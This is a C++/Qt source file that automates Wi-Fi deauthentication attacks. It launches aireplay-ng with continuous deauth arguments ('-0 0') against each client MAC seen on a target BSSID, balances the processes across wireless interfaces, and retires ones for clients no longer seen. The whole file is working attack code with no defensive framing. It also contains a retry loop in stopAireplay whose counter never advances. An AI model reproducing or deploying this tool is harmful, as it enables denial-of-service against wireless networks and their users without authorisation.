#include "aireplay.h"



bool startAireplay(QStringList args,QString MACaddr,QString interface, QHash<QString, Aireplaydata> *aireplayMap)
{
    //Create process
    QProcess *proc = new QProcess;

    args << interface;

    unsigned int i = 0;
    //Start
    while (i < AIREPLAYTRIES)
    {
        //Start

        proc->start("aireplay-ng", args, QIODevice::WriteOnly );
        proc->closeWriteChannel();
        proc->closeReadChannel(QProcess::StandardOutput);
        proc->closeReadChannel(QProcess::StandardError);
        proc->waitForStarted(AIREPLAYPROCESSTIME);

        QThread::msleep(AIREPLAYPROCESSTIME/100);

        if (proc->state() != QProcess::NotRunning)
        {
            break;
        }

        i++;
        proc->kill();
        proc->waitForFinished(AIREPLAYPROCESSTIME);
    }

    if (i == AIREPLAYTRIES)
    {
        proc->deleteLater();
        return false;
    }


    //Append to map
    Aireplaydata data;
    data.iname = interface;
    data.process = proc;
    aireplayMap->insert(MACaddr,data);
    return true;
}

bool stopAireplay(QString MACaddr,QHash<QString, Aireplaydata> *aireplayMap)
{
    Aireplaydata data = aireplayMap->value(MACaddr);
    QProcess *proc = data.process;
    proc->terminate();
    bool terminated = proc->waitForFinished(AIREPLAYPROCESSTIME);
    if (terminated == false)
    {
        unsigned int i = 0;
        while (i < AIREPLAYTRIES)
        {
            proc->kill();
            terminated = proc->waitForFinished(AIREPLAYPROCESSTIME);
            if (terminated == true)
            {
                break;
            }
        }
        if (i == AIREPLAYTRIES)
        {
            return false;
        }
    }

    data.process->deleteLater();
    aireplayMap->remove(MACaddr);
    return true;
}


bool stopALLAireplay(QHash<QString, Aireplaydata> *aireplayMap)
{
    QHashIterator<QString, Aireplaydata> info(*aireplayMap);
    bool executed = true;
    while (info.hasNext()) {
        info.next();
        bool isValid = stopAireplay(info.key(),aireplayMap);
        if (isValid == false)
        {
            executed = false;
        }
    }
    return executed;
}

bool removeOldAireplays(QList<QPair<QString, QDateTime>> inputData,QHash<QString, Aireplaydata> *aireplayMap )
{
    int listLength = inputData.length();
    QString key;
    QHashIterator<QString, Aireplaydata> info(*aireplayMap);
    bool worked = true;
    while (info.hasNext()) {
        info.next();
        //Find key
        bool found = false;
        int i;
        for (i=0;i<listLength;++i)
        {
            key = inputData.at(i).first;
            if (info.key() == key)
            {
                found = true;
                break;
            }
        }
        //Remove old
        if (found == false)
        {
            bool isValid = stopAireplay(info.key(),aireplayMap);
            if (isValid == false)
            {
                worked = false;
            }
        }
    }
    return worked;
}


bool updateAireplays(QList<QPair<QString, QDateTime>> inputData, QString BSSID, QStringList interfaces, QHash<QString, Aireplaydata> *aireplayMap )
{
    //Input data into aireplay
    int listLength = inputData.length();
    int i;
    QString key;
    QDateTime lastseen;
    QStringList args;
    bool worked = true;
    for (i=0;i<listLength;++i)
    {
        key = inputData.at(i).first;
        lastseen = inputData.at(i).second;
        Aireplaydata data;
        if (aireplayMap->contains(key))
        {
            //Update lastseen
            data = aireplayMap->value(key);
            data.lastseen = lastseen;
            aireplayMap->insert(key,data);
        }
        else
        {
            args.clear();
            args << "-0" << "0" << "-a" << BSSID << "-c" << key;

            //Load balancer
            //int select = (aireplayMap->size()) % (interfaces.size());
            //QString interface = interfaces.at(select);

            QString interface;
            bool isValid = leastUsedInterface(*aireplayMap,interfaces,&interface );
            if (isValid == false)
            {
                worked = false;
                continue;
            }

            //Start
            isValid = startAireplay(args,key,interface, aireplayMap);
            if (isValid == false)
            {
                worked = false;
            }
        }
    }
    return worked;
}



bool interfaceCount(QHash<QString, Aireplaydata> aireplayMap,QStringList interfaces, QHash<QString, unsigned int> *sorted)
{
    if (aireplayMap.isEmpty() == true)
    {
        return false;
    }

    if (interfaces.isEmpty() == true)
    {
        return false;
    }

    //Set all to zero
    foreach (const QString &str, interfaces)
    {
        sorted->insert(str,0);
    }

    //Count
    QHashIterator<QString, Aireplaydata> info(aireplayMap);
    while (info.hasNext()) {
        info.next();
        //Get iname
        Aireplaydata data = info.value();
        unsigned int count = sorted->value(data.iname);
        ++count;
        //Increment
        sorted->insert(data.iname,count);
    }

    return true;
}

bool leastUsedInterface(QHash<QString, Aireplaydata> aireplayMap,QStringList interfaces,QString *interface )
{
    if (interfaces.isEmpty() == true)
    {
        return false;
    }

    if (interfaces.length() == 1)
    {
        *interface = interfaces.at(0);
        return true;
    }

    if (aireplayMap.isEmpty() == true)
    {
        *interface = interfaces.at(0);
        return true;
    }

    //Count
    QHash<QString, unsigned int> sorted;
    sorted.reserve(interface->length());
    bool isValid = interfaceCount(aireplayMap,interfaces, &sorted);
    if (isValid == false)
    {
        return false;
    }

    //Find least used interface
    QHashIterator<QString, unsigned int> info(sorted);
    //First Item
    info.next();
    QString currentiname = info.key();
    unsigned int currentcount = info.value();
    while (info.hasNext()) {
        info.next();
        if (currentcount > info.value())
        {
            currentiname = info.key();
            currentcount = info.value();
        }
    }
    *interface = currentiname;
    return true;
}






